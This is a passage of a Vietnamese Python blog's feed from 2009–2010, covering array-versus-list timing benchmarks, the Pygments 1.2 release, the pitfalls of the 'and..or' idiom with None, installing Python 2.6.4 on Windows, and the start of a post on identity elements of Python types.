&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;array(&amp;#39;L&amp;#39;, set(x))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;from array import array; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;x = array(&amp;#39;L&amp;#39;, range(10**7))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;3.823739795026995&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;list(set(x))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x = range(10**7)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;2.216846163641094&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Như vậy sử dụng array sẽ không hiệu quả bằng list trong tình huống này.&lt;/p&gt;
&lt;p&gt;Việc đảo ngược một list cũng luôn luôn nhanh hơn đảo ngược một array. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x.reverse()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x = range(10**7)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.30343171366575916&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x.reverse()&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;import array; x = array.array(&amp;#39;L&amp;#39;, range(10**7))&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;4.0138636612646224&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trên python 3.* bạn phải viết x = list(range(10**7)) do hàm range trong python 3.* trả về iterator chứ không phải list.&lt;/p&gt;
&lt;p&gt;Với phép toán nhân list lại chậm hơn array. Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;100000*x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;from array import array; &lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;x=array(&amp;#39;u&amp;#39;, u&amp;#39;hello world&amp;#39;)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.077855393644313153&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;100000*x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=list(u&amp;#39;hello world&amp;#39;)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.20222266310884152&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Dùng array sẽ kỳ hiệu quả hơn trong phép cộng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x + y&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;from array import array;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;x=array(&amp;#39;L&amp;#39;, range(10*7));y=x[:]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.00019484576660033781&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x + y&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(10*7);y=x[:]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;0.0005318282637745142&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x + y&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;from array import array;&lt;/span&gt;&lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="gp"&gt;... &lt;/span&gt;&lt;span class="s2"&gt;x=array(&amp;#39;L&amp;#39;, range(1000));y=x[:]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;2.354171564954413&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;Timer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;x + y&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;x=range(1000);y=x[:]&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;timeit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;20.363064586337714&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Như vậy là không phải lúc nào array cũng nhanh hơn list. Ít nhất là trong thao tác đảo ngược mảng và sắp xếp. Trong hầu hết các tính toán với danh sách kích thước nhỏ, dùng list sẽ tiện và nhanh hơn.&lt;/p&gt;
&lt;/div&gt;
</content><category term="python array"></category><category term="list"></category></entry><entry><title>Pygments 1.2 với kiểu Monokai</title><link href="/2010/01/pygments-12-voi-kieu-monokai.html" rel="alternate"></link><published>2010-01-05T10:36:00+07:00</published><updated>2010-01-05T10:36:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-01-05:/2010/01/pygments-12-voi-kieu-monokai.html</id><summary type="html">&lt;p&gt;Ngày 01 tháng 01 năm 2010 (ngày đầu năm mới 2010), Georg Brandl đã công bố &lt;a class="reference external" href="http://mail.python.org/pipermail/python-announce-list/2010-January/008034.html"&gt;phiên bản 1.2, tên gọi Neujahr&lt;/a&gt; của gói Pygments.&lt;/p&gt;
&lt;p&gt;Pygments là thư viện làm sáng cú pháp (syntax highlighter) tổng quát, và được sử dụng để tô điểm cho các phần mã nguồn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày 01 tháng 01 năm 2010 (ngày đầu năm mới 2010), Georg Brandl đã công bố &lt;a class="reference external" href="http://mail.python.org/pipermail/python-announce-list/2010-January/008034.html"&gt;phiên bản 1.2, tên gọi Neujahr&lt;/a&gt; của gói Pygments.&lt;/p&gt;
&lt;p&gt;Pygments là thư viện làm sáng cú pháp (syntax highlighter) tổng quát, và được sử dụng để tô điểm cho các phần mã nguồn ở chính trang PCNV này.&lt;/p&gt;
&lt;p&gt;Người dùng có thể tải Pygments từ &lt;a class="reference external" href="http://pypi.python.org/pypi/Pygments"&gt;http://pypi.python.org/pypi/Pygments&lt;/a&gt;, hoặc xem qua một số ví dụ tại &lt;a class="reference external" href="http://pygments.org/demo"&gt;http://pygments.org/demo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Phiên bản 1.2 không còn tương thích với Python 2.3, có hỗ trợ thêm một số cú pháp mới, và đặc biệt là thêm vào &lt;a class="reference external" href="http://www.monokai.nl/blog/2006/07/15/textmate-color-theme/"&gt;kiểu màu Monokai&lt;/a&gt; như các bạn có thể thấy tại trang PCNV.&lt;/p&gt;
</content><category term="monokai"></category><category term="pygments"></category></entry><entry><title>..and..or..</title><link href="/2010/01/andor.html" rel="alternate"></link><published>2010-01-02T16:25:00+07:00</published><updated>2010-01-02T16:25:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2010-01-02:/2010/01/andor.html</id><summary type="html">&lt;p&gt;Trong bài viết trước về &lt;strong&gt;Phần tử không&lt;/strong&gt; tôi có nói về việc cần phải cẩn thận khi dùng phép toán có tương tác giữa phần tử không và &lt;strong&gt;None&lt;/strong&gt;. Trong bài này tôi trình bày một ví dụ nhỏ minh họa rõ hơn một vấn đề mà nhiều bạn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Trong bài viết trước về &lt;strong&gt;Phần tử không&lt;/strong&gt; tôi có nói về việc cần phải cẩn thận khi dùng phép toán có tương tác giữa phần tử không và &lt;strong&gt;None&lt;/strong&gt;. Trong bài này tôi trình bày một ví dụ nhỏ minh họa rõ hơn một vấn đề mà nhiều bạn mới học có thể gặp phải. Đó là phép toán rút gọn &lt;strong&gt;..and..or..&lt;/strong&gt; khi có sự tham gia của &lt;strong&gt;None&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Cấu trúc &lt;strong&gt;if.. else&lt;/strong&gt; và phép gán giá trị theo điều kiện trong python:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;somevalue&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;othervalue&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Có thể được viết trên một dòng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;somevalue&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;othervalue&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DUREX&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;OK&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thực tế có nhiều bạn thích cách viết này. Vì nó gọn hơn và &lt;em&gt;mang tính python&lt;/em&gt; hơn. Tuy nhiên hãy cẩn thận khi sử dụng cấu trúc này. Chẳng hạn trong cấu trúc:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;condition&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;func1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;func2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hàm &lt;strong&gt;func1()&lt;/strong&gt; và &lt;strong&gt;func2()&lt;/strong&gt; có thể có giá trị &lt;strong&gt;None&lt;/strong&gt;, khi đó kết quả kỳ vọng có thể không như bạn mong muốn. Xét ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;func1&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;func2&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;some value&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;func1&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;func2&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Kết quả:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
some value
&lt;/pre&gt;
&lt;p&gt;Biểu thức logic là &lt;strong&gt;True&lt;/strong&gt; song vì &lt;strong&gt;func1() == None&lt;/strong&gt; nên &lt;strong&gt;x = True and None or func2()&lt;/strong&gt; = &lt;strong&gt;&amp;quot;some value&amp;quot;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Vì vậy hãy cẩn thận khi dùng cấu trúc &lt;strong&gt;..and..or..&lt;/strong&gt; trừ khi bạn biết rõ các giá trị tham gia biểu thức này luôn luôn khác &lt;strong&gt;None&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Từ phiên bản 2.5 trở đi Python hỗ trợ cấu trúc:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TrueValue&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;Condition&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="n"&gt;FalseValue&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;OK&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DUREX&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
</content><category term="None"></category><category term="ngôn ngữ"></category></entry><entry><title>Lập trình web với Python (2)</title><link href="/2010/01/lap-trinh-web-voi-python-2.html" rel="alternate"></link><published>2010-01-01T03:05:00+07:00</published><updated>2010-01-01T03:05:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-01-01:/2010/01/lap-trinh-web-voi-python-2.html</id><summary type="html">&lt;div class="section" id="cai-dat-python"&gt;
&lt;h2&gt;Cài đặt Python&lt;/h2&gt;
&lt;p&gt;Sau khi cài đặt máy chủ web Apache, chúng ta cần cài đặt trình thông dịch Python. Chúng ta sẽ sử dụng phiên bản 2.6.4 trong chuỗi bài viết này. Bộ cài đặt Python 2.6.4 có thể được tải về từ &lt;a class="reference external" href="https://www.python.org/download/"&gt;https://www …&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="cai-dat-python"&gt;
&lt;h2&gt;Cài đặt Python&lt;/h2&gt;
&lt;p&gt;Sau khi cài đặt máy chủ web Apache, chúng ta cần cài đặt trình thông dịch Python. Chúng ta sẽ sử dụng phiên bản 2.6.4 trong chuỗi bài viết này. Bộ cài đặt Python 2.6.4 có thể được tải về từ &lt;a class="reference external" href="https://www.python.org/download/"&gt;https://www.python.org/download/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Khi thực thi phần cài đặt, chúng ta sẽ gặp một hộp thoại như sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-1.png" /&gt;
&lt;p&gt;Chọn &lt;strong&gt;Install for all users&lt;/strong&gt; và nhấn nút &lt;strong&gt;Next&lt;/strong&gt; để tiếp tới hình chụp sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-2.png" /&gt;
&lt;p&gt;Nếu bạn muốn cài đặt vào nơi khác thì chọn đường dẫn, nếu không thì chúng ta sẽ sử dụng đường dẫn mặc định &lt;strong&gt;C:Python26&lt;/strong&gt;. Nhấn nút &lt;strong&gt;Next&lt;/strong&gt; để tiếp tục.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-3.png" /&gt;
&lt;p&gt;Chúng ta sẽ nhấn tiếp &lt;strong&gt;Next&lt;/strong&gt; ở hộp thoại này để bắt đầu quá trình cài đặt các phần thông dụng như trình thông dịch, tài liệu, ví dụ...&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-4.png" /&gt;
&lt;p&gt;Hộp thoại trên cho chúng ta biết quá trình cài đặt đang diễn ra.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-5.png" /&gt;
&lt;p&gt;Khi kết thúc, chúng ta chỉ cần nhấn nút &lt;strong&gt;Finish&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Để kiểm tra Python có được cài vào máy chưa thì chúng ta sẽ cần mở màn hình dấu nhắc lệnh (command prompt) bằng cách nhấn vào nút &lt;strong&gt;Start&lt;/strong&gt; và nhập &lt;strong&gt;cmd.exe&lt;/strong&gt; sau đó gõ phím &lt;strong&gt;Enter&lt;/strong&gt; như bình bên dưới.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-6.png" /&gt;
&lt;p&gt;Chúng ta sẽ nhận được một cửa sổ dòng lệnh. Nhập vào cửa sổ dòng lệnh &lt;strong&gt;c:Python26python.exe&lt;/strong&gt; thì chúng ta sẽ thấy rằng trình thông dịch Python được thực thi, và nó hiện ra một dấu nhắc tương tác (interactive prompt) như trong hình sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-7.png" /&gt;
&lt;p&gt;Ngay tại đây chúng ta có thể nhập một câu lệnh Python &lt;tt class="docutils literal"&gt;print 'web programming in python'&lt;/tt&gt;. Câu lệnh này sẽ được thực hiện và kết quả là chúng ta sẽ nhận được chuỗi &lt;strong&gt;web programming in python&lt;/strong&gt; in ra trên màn hình như hình sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-8.png" /&gt;
&lt;p&gt;Để thoát khỏi trình thông dịch Python, chúng ta sẽ nhập vào dòng lệnh &lt;tt class="docutils literal"&gt;quit()&lt;/tt&gt;.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/install-python/python-install-9.png" /&gt;
&lt;p&gt;Để thoát khỏi dấu nhắc dòng lệnh thì chúng ta nhập tiếp lệnh &lt;strong&gt;exit&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Như vậy, chúng ta đã thật sự hoàn tất việc cài đặt trình thông dịch Python. Nếu bạn có nhu cầu tìm hiểu thêm về ngôn ngữ và các thư viện đi kèm thì &lt;a class="reference external" href="/tutorial/2.5/tut.html"&gt;bài chỉ dẫn Python 2.5 bằng tiếng Việt&lt;/a&gt; có lẽ sẽ giúp ích nhiều cho bạn.&lt;/p&gt;
&lt;p&gt;Chúng ta sẽ sẵn sàng cho chương trình web đầu tiên trong bài viết sau! Hẹn gặp lại và chúc mừng năm mới.&lt;/p&gt;
&lt;/div&gt;
</content><category term="install"></category></entry><entry><title>Phần tử không trong Python</title><link href="/2009/12/phan-tu-khong-trong-python.html" rel="alternate"></link><published>2009-12-25T06:30:00+07:00</published><updated>2009-12-25T06:30:00+07:00</updated><author><name>Phạm Thị Minh Hoài</name></author><id>tag:None,2009-12-25:/2009/12/phan-tu-khong-trong-python.html</id><summary type="html">&lt;p&gt;Bài viết này nêu lên một số khía cạnh thú vị (nhưng cũng rắc rối) của kiểu dữ liệu &lt;tt class="docutils literal"&gt;None&lt;/tt&gt; cùng các phép toán liên quan đến nó, qua đó giúp các bạn mới học hiểu sâu sắc hơn về các kiểu dữ liệu có trong Python. Bài viết này …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Bài viết này nêu lên một số khía cạnh thú vị (nhưng cũng rắc rối) của kiểu dữ liệu &lt;tt class="docutils literal"&gt;None&lt;/tt&gt; cùng các phép toán liên quan đến nó, qua đó giúp các bạn mới học hiểu sâu sắc hơn về các kiểu dữ liệu có trong Python. Bài viết này có sử dụng một số khái niệm có trong lý thuyết nhóm chỉ nhằm mục đích minh họa những ý đồ của người viết.&lt;/p&gt;
&lt;div class="section" id="khai-niem-phan-tu-khong"&gt;
&lt;h2&gt;1. Khái niệm phần tử không&lt;/h2&gt;
&lt;p&gt;Trong lý thuyết nhóm có khái niệm về phần tử không hay &lt;a class="reference external" href="http://vi.wikipedia.org/wiki/Ph%E1%BA%A7n_t%E1%BB%AD_%C4%91%C6%A1n_v%E1%BB%8B"&gt;phần tử trung hòa&lt;/a&gt;. Phần tử không &lt;strong&gt;θ&lt;/strong&gt; của một tập &lt;strong&gt;S&lt;/strong&gt; trên phép toán &lt;strong&gt;*&lt;/strong&gt; là phần tử thỏa mãn: &lt;tt class="docutils literal"&gt;a*θ = θ*a = a&lt;/tt&gt; với mọi &lt;strong&gt;a&lt;/strong&gt; trên &lt;strong&gt;S&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Các kiểu dữ liệu cơ bản trong Python cũng có phần tử không như vậy. Xem bảng tổng kết sau:&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="13%" /&gt;
&lt;col width="11%" /&gt;
&lt;col width="14%" /&gt;
&lt;col width="63%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;Kiểu dữ liệu&lt;/th&gt;
&lt;th class="head"&gt;Phép toán&lt;/th&gt;
&lt;th class="head"&gt;Phần tử không&lt;/th&gt;
&lt;th class="head"&gt;Ví dụ&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;Số nguyên&lt;/td&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;0 + 69 = 69 + 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Số thực&lt;/td&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;0.0&lt;/td&gt;
&lt;td&gt;0.0 + 96.0 = 96.0 + 0.0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Danh sách&lt;/td&gt;
&lt;td&gt;+, extend&lt;/td&gt;
&lt;td&gt;[]&lt;/td&gt;
&lt;td&gt;[1] + [] = [] + [1] = [1]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;tuple&lt;/td&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;()&lt;/td&gt;
&lt;td&gt;(1,) + () = () + (1,) = (1,)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Tập hợp&lt;/td&gt;
&lt;td&gt;union&lt;/td&gt;
&lt;td&gt;set([])&lt;/td&gt;
&lt;td&gt;set([1]).union(set([])) = set([]).union(set([1])) = set([1])&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Chuỗi&lt;/td&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;&lt;tt class="docutils literal"&gt;&amp;quot;&amp;quot;&lt;/tt&gt;&lt;/td&gt;
&lt;td&gt;&amp;quot;abc&amp;quot; + &amp;quot;&amp;quot; = &amp;quot;&amp;quot; + &amp;quot;abc&amp;quot; = &amp;quot;abc&amp;quot;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Từ điển&lt;/td&gt;
&lt;td&gt;update&lt;/td&gt;
&lt;td&gt;{}&lt;/td&gt;
